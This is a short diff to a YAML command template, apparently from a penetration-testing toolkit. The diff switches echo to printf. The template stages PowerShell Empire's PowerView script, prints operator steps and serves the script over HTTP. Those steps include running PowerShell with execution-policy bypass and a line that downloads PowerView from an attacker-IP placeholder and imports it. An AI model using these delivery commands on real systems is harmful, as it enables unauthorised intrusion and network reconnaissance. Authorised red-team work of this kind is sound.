@@ -7,9 +7,9 @@ metadata:
 
 content: |
   mkdir -p packstation/outbound; cp -n /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1 packstation/outbound; \
-  echo '================================================================'; \
-  echo '                      -----PowerShell-----                      '; \
-  echo 'Preparation: powershell -ep bypass'; \
-  echo 'Deliver and import module: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/powerview.ps1 -Outfile {{ delivery_path_windows }}\powerview.ps1; Import-Module {{ delivery_path_windows }}\powerview.ps1'; \
-  echo '================================================================'; \
+  printf '%s\n' '================================================================'; \
+  printf '%s\n' '                      -----PowerShell-----                      '; \
+  printf '%s\n' 'Preparation: powershell -ep bypass'; \
+  printf '%s\n' 'Deliver and import module: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/powerview.ps1 -Outfile {{ delivery_path_windows }}\powerview.ps1; Import-Module {{ delivery_path_windows }}\powerview.ps1'; \
+  printf '%s\n' '================================================================'; \
   python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
